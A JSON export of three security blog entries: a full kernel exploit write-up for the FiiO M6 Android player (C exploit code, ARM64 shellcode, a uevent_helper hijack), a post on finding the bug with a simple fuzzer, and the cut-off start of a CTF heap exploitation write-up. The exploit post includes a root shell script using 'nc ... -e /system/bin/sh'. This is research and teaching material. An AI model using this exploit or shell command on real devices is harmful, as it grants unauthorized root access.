[ { "title": "Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug", "url": "/posts/fiio-m6-exploit/", "categories": "Exploit Dev, Android", "tags": "android, kernel, research", "date": "2023-03-27 21:33:00 -0600", "snippet": "Overview:A little over a month ago, I wrote a blog post detailing how I found a kernel vulnerability in the FiiO M6 Hi-Fi MP3 player. I would recommend reading that post first, but to recap: The device is Android-based, running a version 3.18 AArch64 Linux kernel The ftxxxx-debug entry in procfs has a write-handler which suffers from a straight forward stack-overflow. It reads an arbitrary amount of user-controlled data into a fixed size kernel buffer using the copy_from_user functionHaving never done any kernel exploit dev, the thought of turning this bug into a weaponized privilege escalation initially felt out of the picture. However, upon further consideration, I realized this was essentially the “Hello World” of Linux exploitation on a real-world device; if I was gonna find an entry point into the field, this might as well be it. What followed was 30 days filled with reading, learning, and a LOT of waiting for the device to reboot after crashing. The remainder of this post will cover the technical details of the successful exploit, skimming over the extensive trial and error which took place. I may include a part 3 post or video recapping and reflecting on the project and going more in-depth on the learning process.TL;DR:The device does not have any stack canaries, so our overflow allows us to directly overwrite the saved x30 return pointer. While SMAP/SMEP are enabled, the kernel stack is marked as executable and KASLR is disabled. At the time of our overflow, register x21 always holds a pointer to somewhere in the kernel stack, which contains our user-controlled data. We can use the gadget blr x21 to jump to custom shellcode included in the overflow payload. Our shellcode performs a “HotPlugEater” attack, in which uevent_helper is overwritten to point to an attacker-controlled script, executing the malicious payload with root permissions. While there are numerous more “standard” ways to achieve the same effect once obtaining control over PC, the inability to do any kernel debugging and the lack of ARM64 Linux kernel exploitation resources presented significant hurdles.Picking Up Where We Left Off:Finding the Offset To The Saved Return Pointer:At the end of the previous post, I released a Crash PoC for the vulnerability. It has been included again below:use std::io::{Read, Write, stdin, stdout};use std::fs::OpenOptions; fn main() {\t// create our long payload let mut buf = vec![0x41u8; 32 * 1024]; println!(\"{}\", buf.len());\t// open /proc/ftxxxx-debug for writing let path = \"/proc/ftxxxx-debug\"; let fd = OpenOptions::new().write(true).open(path); print!(\"Writing {:?}\\n\", path); if let Ok(mut fd) = fd {\t\tlet fuzz_size = buf.len();\t\tlet _ = fd.write(&amp;buf[..fuzz_size]); }}For this proof-of-concept code, I chose an arbitrarily long buffer (32 * 1024 bytes) which I knew would cause a crash. However, after confirming there were no stack canaries, the first step for the exploit was to determine the offset to the saved link register (x30). At the end of each function call in ARM64, this saved value is popped back off the stack into x30. Upon encountering a RET instruction, the program loads the value of x30 into the PC.To determine the offset, I manually created random payloads and then checked what the PC value was in the kernel crash. After a few attempts, I was able to determine that the offset was 1024 bytes. As such, we can update the crash PoC to have the following payload:// ... previous code ...let mut buf = vec![0x41u8, 8 * 128]; // 1024 bytes of junk 0x41slet mut buf1 = vec![0x42u8, 8]; // 8 bytes of 0x42, overwriting our saved x30 addressbuf.append(&amp;mut buf1);// ... previous code ...Reviewing the kernel panic now, the PC is filled with our 8 0x42s, indicating that we have successfully found the offset to the saved x30 value and can redirect program execution.Obtaining the Kernel Symbols:The next step of the process was to obtain kernel symbols. While our shell user does have read permissions to /proc/kallsyms, kptr_restrict is set to 2 and thus all the addresses are shown as 0.After a bit of digging, I found a GitHub repo dedicated to extracting symbols from ARM64 Android Kernel images. I was able to obtain the firmware for the FiiO M6 directly from their website. Extracting the provided zip file was enough to obtain the kernel image individually. Using it with the script from GitHub, we can dump all the kernel symbols! Since there’s no KASLR, these are static values which we can hardcode into our exploit.Kernel Debugging?Since this was my first kernel exploit ever, I was really hoping to get some form of a debug set-up working. I assumed the contents inside the FiiO firmware package would be enough to get an emulated kernel up and running. However, after a week of attempting, I had made no progress. I am still fairly confident it can be done, but I couldn’t figure it out and didn’t want to spend any more time on it. I switched gears a bit and tried to patch the bootloader to root the device, but this also proved unsuccessful. I decided to proceed with no debugging capabilities, and return only if I couldn’t figure out how to craft an exploit without them.Exploitation:Initial Strategy:Now that we have kernel symbols and the ability to redirect program execution, it’s time to come up with an exploit strategy. After a few days of learning about Linux privesc exploit techniques, I decided that using the classic commit_creds(prepare_kernel_cred(NULL)) path would probably be best. You can learn more about this privesc strategy here but the quick summary is: prepare_kernel_cred creates a root-privileged cred when called with a NULL argument commit_creds takes a pointer to a cred structure, and sets the current process to have that privilege levelTherefore, commit_creds(prepare_kernel_cred(NULL)) sets the process’s privilege level to root. After that, we just return execution out of kernel mode and back to our userland process.Surely The Stack Isn’t Executable, Right…?With our exploit strategy in mind, I set out to write a ROP chain. There are almost no publicly available resources on ARM64 kernel ROP, but I was able to find some useful posts about userland exploitation, such as a post from Perfect Blue and a talk from Billy Ellis.As the architecture expands in popularity, maybe one day we will see more write-ups on the subject. Today, however, is not that day. About midway through struggling to craft and debug a proper ROP chain, I spotted something interesting. The x21 register pointed to an area on the stack which we could overflow with anything we wrote after overwriting the saved x30 value. For example, we can use the following code:uint64_t fake_ret_addr = 0x4242424242424242ULL; uint64_t x21_overflow = 0x4343434343434343ULL; static int exploit() { int fd; fd = open(\"/proc/ftxxxx-debug\", O_RDWR); unsigned char buf[4096]; memset(buf, 0x41, 1); memset(buf+1, 0x0, 1023); uint64_t *chain = (uint64_t *)&amp;buf[1024]; *chain++ = (uint64_t)fake_ret_addr; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; write(fd, buf, 4096); return 0; }And now reviewing the crash logs, we can see that x21 holds our 0x43sI had been under the assumption that the stack was not executable, but I decided there was no harm putting this belief to the test. I used ropper to find a blr x21 gadget and overwrote the saved x30 with it. This would redirect code execution to the pointer stored in x21.uint64_t kernel_base = 0xFFFFFFC000080000ULL; uint64_t blr_x21 = 0x000000000001e664ULL + kernel_base;// ... previous code ... uint64_t *chain = (uint64_t *)&amp;buf[1024]; *chain++ = (uint64_t)blr_x21; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; *chain++ = (uint64_t)x21_overflow; If the stack was executable, this address would then be deference and our junk data would be interpreted as code. It’s at least seemed worth a shot…We can see above that our PC value and x21 value are the same, indicating that our ROP chain seems to have executed properly. We also get the following line from the end of the kernel panic:This error message seems to indicate that our 0x43s are being interpreted as valid instructions, but it’s still hard to tell. Maybe the error message is just a fluke?I changed the entire chain to be NOPs, except the last line, which was still our x21_overflow junk data.uint64_t nop = 0xd503201fd503201f;// ... previous code ... uint64_t *chain = (uint64_t *)&amp;buf[1024]; *chain++ = (uint64_t)blr_x21; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; // ... continue chain *chain++ = (uint64_t)nop; *chain++ = (uint64_t)x21_overflow; If the code on the stack was actually executing, it would go down the NOP sled before throwing the same error. Furthermore, our PC would now point to a different address than x21, since it successfully executed instructions.I was honestly in disbelief that this worked. We now have a very simple gadget which reliably allows us to jump to our own shellcode, executing in supervisor mode (EL1).Writing The Shellcode:The obvious next step was to come up with our shellcode. In order to do that, we need to grab the addresses for both commit_creds and prepare_kernel_credAfter that, we can start putting together some ARM64 assembly:mov x0, xzr // move 0x0 into x0 mov x2,  #0x6368 // mov addr of prepare_kernel_cred into x2movk x2, #0x000b, lsl #16 movk x2, #0xffc0, lsl #32 movk x2, #0xffff, lsl #48 blr x2 // branch to addr in x2mov x4,  #0x5ffc // mov addr of commit_creds into x4movk x4, #0x000b, lsl #16 movk x4, #0xffc0, lsl #32 movk x4, #0xffff, lsl #48 blr x4 // branch to addr in x4...This code works as follows: Move 0x0 into x0. ARM64 specifies that x0 will always hold the first argument when a function is called. We want the argument passed to prepare_kernel_cred to be NULL, which is equivalent to 0x0 Load the address of prepare_kernel_cred into x2 and branch to it The return value of prepare_kernel_cred is a pointer to the newly created credential. ARM64 specifies that all return values will be passed back to the callee in x0. This works out for us, because the next step is to call commit_creds with a pointer to our cred argument in x0. Thus we don’t have to do anything when prepare_kernel_cred returns Load the address of commit_creds into x4 and branch to it.After this, we need to switch out of supervisor mode and cleanly return to userland. This is where things became significantly less straightforward. A few things need to happen: We need to specify what address to return to We need to restore the userland stack pointer We need to set saved program status registersThe good news is that because x21 consistently holds a pointer into our user-controlled data, we can pass a userland stack pointer and userland return value via our buffer overflow payload.To debug this, we will compile the above shellcode which doesn’t yet return from supervisor mode. We will make the last instruction 0x41414141, causing a kernel panic and allowing us to dump the register states. Our exploit payload will include a bogus stack pointer and the address of the function we wish to return to. We can then review the kernel panic logs in order to determine the offsets and finish out our shellcode. In all, our exploit functions look as follows:#include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;iostream&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/stat.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/wait.h&gt; #include &lt;spawn.h&gt; uint64_t kernel_base = 0xFFFFFFC000080000ULL; uint64_t blr_x21 = 0x000000000001e664ULL + kernel_base; uint64_t nop = 0xd503201fd503201f; uint64_t junk = 0x4242424242424242ULL; static int win() { puts(\"[+] Returned from supervisor mode\\n\"); char *argv[] = { \"busybox1.11\", \"touch\", \"/data/local/tmp/test.txt\", NULL }; char *envp[] = { NULL }; puts(\"[!] Win\\n\") execve(\"/system/bin/busybox1.11\", argv, envp); return 0; } static int exploit() { int fd; fd = open(\"/proc/ftxxxx-debug\", O_RDWR); unsigned char buf[4096]; memset(buf, 0x41, 1); memset(buf+1, 0x0, 1023); uint64_t stack_size = 0x1000; void *stack_base = mmap(NULL, stack_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0); if(stack_base == MAP_FAILED) { puts(\"[!] mmap failed!\"); return -1; } void *stack_top = (void *)((uint64_t)stack_base + stack_size); printf(\"[+] Stack Pointer: %llx\\n\", (uint64_t)&amp;stack_top); printf(\"[+] win() address: %llx\\n\", (uint64_t)&amp;win); unsigned char shellcode[] = { 0xe0, 0x03, 0x1f, 0xaa, 0x02, 0x6d, 0x8c, 0xd2, 0x62, 0x01, 0xa0, 0xf2, 0x02, 0xf8, 0xdf, 0xf2, 0xe2, 0xff, 0xff, 0xf2, 0x40, 0x00, 0x3f, 0xd6, 0x84, 0xff, 0x8b, 0xd2, 0x64, 0x01, 0xa0, 0xf2, 0x04, 0xf8, 0xdf, 0xf2, 0xe4, 0xff, 0xff, 0xf2, 0x80, 0x00, 0x3f, 0xd6, 0x41, 0x41, 0x41, 0x41, // Bad Instruction to cause kernel panic }; uint64_t *chain = (uint64_t *)&amp;buf[1024]; *chain++ = (uint64_t)blr_x21; *chain++ = (uint64_t)junk; *chain++ = (uint64_t)junk; *chain++ = (uint64_t)junk; *chain++ = ((uint64_t)&amp;win); *chain++ = (uint64_t)((uint64_t)&amp;stack_top); *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; *chain++ = (uint64_t)nop; memcpy(buf + 1216, shellcode, sizeof(shellcode)); puts(\"[+] Ropping to shellcode...\"); write(fd, buf, 1024 + 1216 + sizeof(shellcode)); return 0; } int main() { std::cout &lt;&lt; \"[+] Starting trigger...\\n\"; exploit(); return 0; }Running it, we get a kernel panic as expected.Lets break down the kernel crash logs. First of all, we see that x0 is equal to 0x0. This is what we want to see - commit_creds returns a 0 if completed execution without issue, so we can take this as an indicator that our shellcode was able to successfully execute. Also note that x21 is equal to 0xffffffc01521fec8.Scrolling down, the crash dump gives us the data where x21 is currently pointing. Note that data before and after the actual pointer is shown (x21 is pointing at the fec8 line).We can note that our win() address (0x0000000078942300) is stored at x21 - 0x80. The next 8 bytes are our bogus stack pointer which we mmapped before the payload. With this information, we can finish out our shellcode to return to usermode:// ... previous code ...sub x2, x21, #0x80 // store pointer to win address in x2ldr x1, [x2] // deref pointer into x1. x1 now holds win() addressldr x4, [x2, #0x08] // deref pointer+0x8 into x4. x4 now holds fake stack pointermov x0, xzr // move 0 into x0 MSR SP_EL0, x4 // set EL0 (usermode) stack pointer to x4MSR ELR_EL1, x1 // set EL1 (kernelmode) return address to x1MSR SPSR_EL1, x0 // set status regs to 0x0ERETGame over, right?Not quite. We do successfully return from supervisor mode with our elevated privs. However, as soon as we try to make another syscall, the program segfaults. The device itself doesn’t crash, but our program stops running. Because we did elevate our privs on the process itself, we have root for a nanosecond, but we can’t even do anything interesting with it.I spent over a week trying to debug this issue (which looking back on it, was way too much time). The segfault almost certainly stemmed from the ugly way the shellcode ERET back to userspace without taking into account the previous state, the call stack, or any other information. I tried numerous techniques to save / restore the state and jump to different areas of my code, but nothing seemed to work. Being so close to having a root shell, I was reluctant to step back and try a different approach. But after officially running out of ideas, I went back to the drawing board.Back To The Drawing Board:To recap, we currently have the following: Read, write, and execute primitives in EL1 (supervisor mode) The ability to return from supervisor mode without crashing the kernel, but without being able to make another syscall or fork our current process.With this information, I went to Google and started poking around. I should also shout out some friends in one of my private exploit dev discords who provided a few suggestions. In the end, however, it was a random slidedeck from 2016 which gave the breakthrough.The HotplugEater Attack:This presentation by dong-hoon you presented a technique he called the HotplugEater Attack. I have included the relevant slide below:The idea is as follows: The global variable uevent_helper points to a script which the kernel uses on a hotplug event. If we can overwrite this variable to point to an attacker controlled script, it will execute with root permissions. Simply changing the variable is enough to trigger the kobject_uevent_env function, which will in turn call our malicious script.Putting It All Together:We can dump the address of uevent_helper with the Python script we used earlier. Our new exploit will now work as follows: Create a script in /data/local/tmp/ which we want to execute with root permissions Trigger our overflow on ftxxxx-debug and ROP to our shellcode The shellcode will overwrite uevent_helper with the path to our malcious script in /data/local/tmp, return to usermode, and gracefully exit (by way of segfaulting). After ~10 seconds, the kernel will execute our scriptWith this in mind, we need to write some new shellcode which performs the actions outlined in point number 3. That shellcode has been included and commented below:mov x2,  #0xc7c8 // move the address of `uevent_helper` into x2movk x2, #0x00c2, lsl #16 movk x2, #0xffc0, lsl #32 movk x2, #0xffff, lsl #48 mov w3, #'/' // store the value `/data/local/tmp/cmd` byte by byte at x2 strb w3, [x2] mov w3, #'d' strb w3, [x2, #1] mov w3, #'a' strb w3, [x2, #2] mov w3, #'t' strb w3, [x2, #3] mov w3, #'a' strb w3, [x2, #4] mov w3, #'/' strb w3, [x2, #5] mov w3, #'l' strb w3, [x2, #6] mov w3, #'o' strb w3, [x2, #7] mov w3, #'c' strb w3, [x2, #8] mov w3, #'a' strb w3, [x2, #9] mov w3, #'l' strb w3, [x2, #10] mov w3, #'/' strb w3, [x2, #11] mov w3, #'t' strb w3, [x2, #12] mov w3, #'m' strb w3, [x2, #13] mov w3, #'p' strb w3, [x2, #14] mov w3, #'/' strb w3, [x2, #15] mov w3, #'c' strb w3, [x2, #16] mov w3, #'m' strb w3, [x2, #17] mov w3, #'d' strb w3, [x2, #18] mov x3, xzr // terminate our string with a null byte by moving 0x0 into x3 and storing x3 at x2 + 19str x3, [x2, #19] sub x2, x21, #0x80 // ret to our win() function the same way we did in the previous shellcodeldr x1, [x2] ldr x4, [x2, #0x08] mov x0, xzr MSR SP_EL0, x4 MSR ELR_EL1, x1 MSR SPSR_EL1, x0 ERETWe can create an exploit bash script which does the following:!/system/bin/shecho \"[+] Creating malicious script at /data/local/tmp/cmd...\" echo \"#!/system/bin/sh\" &gt;&gt; /data/local/tmp/cmd echo \"/system/bin/busybox1.11 nc 127.0.0.1 4444 -e /system/bin/sh\" &gt;&gt; /data/local/tmp/cmd chmod 777 cmdecho \"[+] Starting exploit...\" /data/local/tmp/poc 2&gt;/dev/null sleep 5echo \"[+] Launching listener...\" echo \"[!] Wait for r00t shell...\" /system/bin/busybox1.11 nc -lp 4444This script will create a new bash file at /data/local/tmp named cmd, which lines up with our shellcode. cmd’s only function is to forward a shell to a localhost listener on port 4444.The script then runs our exploit code, which will overwrite the uevent_helper variable to point at our cmd file. Finally, we launch a listener on port 4444 waiting for the kernel to execute the cmd file, giving us a root shell.The full exploit code can be found on my GitHub.Next Steps:While this project is pretty much over, the last thing I would love to do is pack the exploit into an APK and give users the ability to root their device.I also have some other Android based devices laying around the house, such as the HiSense Touch and the Onyx Pocket 2. This project has been a ton of fun, so maybe I will pick one of those to target in the future.If you enjoyed this post and want to stay up to date on my future research projects, feel free to give me a follow on Twitter." }, { "title": "Rooting the FiiO M6 - Part 1 - Using the \"World's Worst Fuzzer\" To Find A Kernel Bug", "url": "/posts/fiio-m6-kernel-bug/", "categories": "Vuln Research, Android", "tags": "android, kernel, research", "date": "2023-02-18 20:33:00 -0700", "snippet": "Overview:A few months ago, I was cleaning off my hardware workbench when I came across my FiiO M6, an Android-based “portable high-resolution lossless music player”. I originally purchased the device to aid in my language learning studies and dabble in the world of “hi-fi” audio. With both those phases of my life well in the past, the device seemed to make a perfect vulnerability research target. Coincidentally, I had also just watched through all of gamozolabs’s Android exploitation livestream, so I was feeling even more inspired to target an Android-based device.Prior to this project, I had never looked for Android vulns and had no kernel VR/exploit dev experience. As such, quite a bit of reading, watching, and asking was involved to find even the trivial bug presented in this write-up. Should anyone more knowledgeable in these topics notice any inconsistencies or misunderstandings, please do not hesitate to reach out. While this post is primarily focused on the bug itself, I do plan to make a corresponding video to go more in-depth on the set-up, tools, and lessons learned. As someone who has never done this kind of work prior, I hope to get others started on the same path.TL;DR:The FiiO M6 has a kernel driver for its touchscreen. This driver creates an entry in the /proc filesystem named ftxxxx-debug with global read and write permissions. The function assigned to handle write operations suffers from a straight forward stack-based buffer overflow, in which a user can overflow the 128-byte buffer, resulting in a crash.Initial Recon:Getting A ShellThe first thing I did was get USB debugging working. This was done by enabling the Developer Options on the device and setting up Android Debug Bridge (adb) on my laptop. Once that was done, I was able to run adb shell and drop into a shell on the device.As you can see in the above screenshot, the device was running a pretty old kernel version. This improved my hopes of being able to potentially find a vuln, even with my limited knowledge and skill set.Next, I did a bit of manual searching, looking for anything interesting. However, because I am a total n00b with LPE bugs, nothing really jumped out to me immediately and I honestly wasn’t super sure where to be looking.Source Code:Now that I had a shell on the device and had done my basic recon, I figured the next logical step would be to get kernel source and look at device drivers and other potential attack vectors. While FiiO claims to release all their kernel source, it quickly became apparent this was only kind of true. There is a repo named “FiiO_Kernel_Android_M6-M7-M9.” However, it only has one commit with the comment first init. In addition, it has multiple open issues claiming that the source is both incomplete and will not build. I could also see information about drivers running on the device that simply were not in the repo, so I figured this avenue might not be as reliable as I had initially hoped.Methodology:With no definitive kernel source, I was left with 2 options: reversing or fuzzing. Since I truly had no idea where to begin looking, I opted for the latter in hopes that it might steer my aimless journey through the Linux filesystem towards something that may be worth focusing on.(Very) Dumb Fuzzing:I remembered watching a gamazolabs stream where he was using what he deemed to be the “worlds worst Android fuzzer”. A quick Google search revealed to this blog post, in which he details the process of creating the dumb fuzzer. It’s basic methodology is as follows: Take a supplied directory Recursively iterate through the directory looking for files that we have read and/or write perms for If we have read permissions, try and read the file If we have write permissions, try and write garbage to the file. ProfitHe then goes on to improve the fuzzer, but I decided the very dumb version was good enough for me, and modified the supplied source accordingly (full source provided below) to follow the exact methodology explained above.Compiling and running it, the device crashed in &lt; 1 sec. I figured if it crashed that fast, there would certainly be a number of potential other crashes here to triage, so I made more adjustments to the script: Reduce the number of threads to 1 and have the 1 worker print what file it’s currently working on Ignore files that we can read, and only focus on files with write permissionsThus the final form of my extremely dumb fuzzer looked as follows:extern crate rand;use std::sync::{Arc, Mutex};use std::fs::OpenOptions;use std::io::{Read, Write};use std::path::{Path, PathBuf};/// Maximum number of threads to fuzz withconst MAX_THREADS: u32 = 1;fn listdirs(dir: &amp;Path, output_list: &amp;mut Vec&lt;(PathBuf, bool)&gt;) { // List the directory let list = std::fs::read_dir(dir); if let Ok(list) = list { // Go through each entry in the directory, if we were able to list the // directory safely for entry in list { if let Ok(entry) = entry { // Get the path representing the directory entry let path = entry.path(); // Get the metadata and discard errors if let Ok(metadata) = path.symlink_metadata() { // Skip this file if it's a symlink if metadata.file_type().is_symlink() { continue; } // Recurse if this is a directory if metadata.file_type().is_dir() { listdirs(&amp;path, output_list); } // Add this to the directory listing if it's a file if metadata.file_type().is_file() { //let can_read = // OpenOptions::new().read(true).open(&amp;path).is_ok(); let can_write = OpenOptions::new().write(true).open(&amp;path).is_ok(); //output_list.push((path, can_read, can_write)); output_list.push((path, can_write)); } } } } }}/// Fuzz thread workerfn worker(listing: Arc&lt;Vec&lt;(PathBuf, bool)&gt;&gt;) { // Fuzz buffer let mut buf = vec![0x41u8; 32 * 1024]; // Fuzz forever 'next_case: loop { let rand_file = rand::random::&lt;usize&gt;() % listing.len(); let (path, can_write) = &amp;listing[rand_file]; if path.starts_with(\"/proc/\") &amp;&amp; path.to_str().unwrap().chars().nth(6).unwrap().is_digit(10) { continue; } if *can_write { // Fuzz by writing let fd = OpenOptions::new().write(true).open(path); print!(\"Writing {:?}\\n\", path); if let Ok(mut fd) = fd { let fuzz_size = rand::random::&lt;usize&gt;() % buf.len(); let _ = fd.write(&amp;buf[..fuzz_size]); } } }}fn main() { print!(\"Starting...\\n\"); let mut dirlisting = Vec::new(); listdirs(Path::new(\"/\"), &amp;mut dirlisting); print!(\"Created listing of {} files\\n\", dirlisting.len()); // We wouldn't do anything without any files assert!(dirlisting.len() &gt; 0, \"Directory listing was empty\"); // Wrap it in an `Arc` let dirlisting = Arc::new(dirlisting); // Spawn fuzz threads let mut threads = Vec::new(); for _ in 0..MAX_THREADS { // Create a unique arc reference for this thread and spawn the thread let dirlisting = dirlisting.clone(); threads.push(std::thread::spawn(move || worker(dirlisting))); } // Wait for all threads to complete for thread in threads { let _ = thread.join(); }} Getting a Crash and Triaging:After only about 15 seconds, the modified script with only 1 thread got a crash. The output of our fuzzer indicates the crash took place while writing to ftxxxx-debug.Once the device rebooted, the logs stored in /sys/fs/pstore/console-ramoops showed the following:Nice! Based on the information displayed in the above two screenshots, I assumed that this was some sort of stack-based overflow in /proc/ftxxxx-debug ‘s write handler and the garbage data has smashed the stack and overwritten the saved return pointer, which is how the 0x41s ended up in the PC register.Root Cause Analysis:As mentioned, while I didn’t have source for this device, a quick google for ftxxxx-debug turned up the source for a touchscreen driver on the ZENFONE2. While we can’t be certain that this is the same exact source running on the M6, it was actually good enough to perform an RCA on.In ZENFONE2/drivers/input/touchscreen/ftxxxx_ex_fun.c, we see the following:#define PROC_NAME \"ftxxxx-debug\"static unsigned char proc_operate_mode = PROC_UPGRADE;static struct proc_dir_entry *ftxxxx_proc_entry;static ssize_t ftxxxx_debug_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);static ssize_t ftxxxx_debug_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos);static const struct file_operations ftxxxx_proc_fops = {\t.owner = THIS_MODULE,\t.read = ftxxxx_debug_read,\t.write = ftxxxx_debug_write,};This shows an entry in the /proc filesystem being created with the name ftxxxx-debug and assigned handlers for both read and write operations. Since the crash happened during a write operations, we are mainly interested in the ftxxxx_debug_write function. The beginning of that function is as follows:static ssize_t ftxxxx_debug_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){\t... \tunsigned char writebuf[FTS_PACKET_LENGTH];\tint buflen = count;\tint writelen = 0;\tint ret = 0;\tif (copy_from_user(&amp;writebuf, buf, buflen)) {\t\tdev_err(&amp;client-&gt;dev, \"%s:copy from user error\\n\", __func__);\t\treturn -EFAULT;\t}\tproc_operate_mode = writebuf[0];\t...}The buf parameter is a pointer to our user space buffer which contains the data we are writing (the garbage 0x41s). The count parameter is the length of that payload.The function starts by initializing a writebuf which has a length of FTS_PACKET_LENGTH. Then it copies the total bytes of our write data into a new local variable, buflen. Finally it calls copy_from_user, passing in our kernel stack buffer, a pointer to our user space buffer, and the amount of data to be copied. True to its name, this function will “copy a block of data from user space” per its man pageJumping to ftxxxx_ex_fun.h, we see the following on line 41:#define FTS_PACKET_LENGTH 128Because buf and buflen are both user controlled values, we control an arbitrary amount of data to be written into a 128 byte kernel buffer, resulting in a buffer overflow!Looking at the next part of the function, we see the following:static ssize_t ftxxxx_debug_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){ ... \tproc_operate_mode = writebuf[0];\tswitch (proc_operate_mode) {\tcase PROC_UPGRADE:\t\t...\tcase PROC_READ_REGISTER:\t\t...\tcase PROC_WRITE_REGISTER:\t\t...\tcase PROC_AUTOCLB:\t\t...\tcase PROC_READ_DATA:\tcase PROC_WRITE_DATA:\t\t...\t\t\tdefault:\t\tbreak;\t}\treturn count;I have removed the logic from each of the switch statement cases, as they are not relevant. What is relevant, however, is that the first byte of our overflowed buffer is used to determine the case for the switch. The constants are defined in the same file:#define PROC_UPGRADE 0#define PROC_READ_REGISTER 1#define PROC_WRITE_REGISTER 2#define PROC_AUTOCLB 4#define PROC_UPGRADE_INFO 5#define PROC_WRITE_DATA 6#define PROC_READ_DATA 7As such, any value that is not 0 through 7 (like say, 0x41 ) will evaluate to the default case, breaking from the switch and automatically returning. This causes our overflowed saved return pointer to be loaded into the PC and correspondingly crash.Crash PoC:use std::io::{Read, Write, stdin, stdout};use std::fs::OpenOptions; fn main() {\t// create our long payload let mut buf = vec![0x41u8; 32 * 1024]; println!(\"{}\", buf.len());\t// open /proc/ftxxxx-debug for writing let path = \"/proc/ftxxxx-debug\"; let fd = OpenOptions::new().write(true).open(path); print!(\"Writing {:?}\\n\", path); if let Ok(mut fd) = fd { let fuzz_size = buf.len(); let _ = fd.write(&amp;buf[..fuzz_size]); }}Future Research:While I haven’t weaponized this bug yet, it does appear to be highly exploitable at face value, depending on the kernel mitigations in place. For next steps, I would love to get an emulated version of the kernel running in order to debug an exploit. That is way outside of something I have done before, but I think it would be a great challenge. Depending on the mitigations in place, one or multiple additional bugs may be required to get arbitrary kernel execution, but based on the security posture of the device so far, I am willing to bet that they could be found with enough time and effort." }, { "title": "UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge", "url": "/posts/swordmaster-pwn-chal/", "categories": "CTF, PWN", "tags": "pwn, ctf, heap", "date": "2022-09-25 21:33:00 -0600", "snippet": "Swordmaster Pwn ChallengeOverview:This challenge was part of the ROMHack CTF hosted on HackTheBox’s CTF platform. At the end of the 48 hour event, the challenge had roughly 10 solves. I was sadly not one of them, but did end up solving it Sunday night, a few hours after the CTF had concluded.For this challenge, the binary, libc.so.6 and ld-linux-x86-64.so.2 were provided.TL;DR:Getting the flag for this challenge requires the exploitation of 3 bugs. First, we can leak the base address of libc with a format string vulnerability. Next, we can obtain the base address of the heap with a Use-After-Free (UAF) vulnerability. Finally, we can corrupt the top chunk of the heap’s metadata, allowing us to execute a “House Of Force” attack, overwriting __malloc_hook with system and obtaining a shell.Recon - Functionality and RE:Binary Walkthrough:When we first run the challenge binary, we are asked to input our name and choose our class. After that, we are shown the menu, where we can conduct a number of actions. We will talk about each menu option and it’s underlying implementation as it becomes relevant to exploitation.For now, let’s jump into Ghidra and see if we can find any vulnerabilities.Reversing:Player structJumping into main, we first see that there is a global player structure. The program mallocs space for the player’s name and class.Here we see the program reads 0x1f bytes from stdin and assigns them to the first field in the player structure. Next, it takes in an integer and compares it in a big conditional statement.I have included the if statement for if a player chooses the number 2. We can see it prints that the mage class was chosen and then writes “Mage” to the other field in the player object which was previously malloc’d. After the conditional block for the chosen class is completed, the player_init function is run with the player structure passed in as a parameter. I have gone ahead and renamed the fields for easy of readability:So, with this, we can assume that the global player struct looks something like the following:struct Player {\tchar *name;\tint level;\tint gold;\tint attack;\tint dex; \tint hp;\tchar *class;}This can be confirmed by observing the player structure (named pl) in gdb after player_init is run:If we translate this memory layout to the struct above will get a player with a name stored at 0x0000555555605270, a level of 1, 69 (0x45) gold, 10 (0xa) attack, 20 (0x14) dex, 100 (0x64) hp, and a class string stored at 0x00005555556052a0. Running heap chunks, we can see our name and class name on the heap at the expected memory addresses:Menu Handler:Now that we know how the player struct is stored in memory, let’s take a look at the handler for the binary’s game menu.The program first checks to see if we still have enough remaining energy to execute. If our energy is out, the program returns. If we still have energy, the menu options are handled in a large switch statement based on the user input. We will talk more about each handler function as they become relevant to exploiting the challenge.Memory Protections and Libc:Running checksec, we can see what memory protections the binary has in place..spoiler alert, it’s basically all of themWith Stack Canaries, NX, and 